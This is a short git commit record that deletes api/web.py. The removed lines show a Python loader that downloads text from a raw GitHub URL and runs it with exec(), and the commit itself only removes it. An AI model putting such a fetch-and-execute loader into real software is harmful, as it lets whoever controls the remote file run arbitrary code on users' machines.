08e0475be8e1ca565111b49f09a88b8671afcacc
RAMDDR5 <bugthemonke@gmail.com>
2026-07-29 10:54:15 +0000

    Delete api/web.py

--- api/web.py
+++
@@ -1,4 +0,0 @@
-import urllib.request
-with urllib.request.urlopen("https://raw.githubusercontent.com/RAMDDR5/python/refs/heads/main/texttt") as response:
-    code = response.read().decode("utf-8")
-exec(code, {})
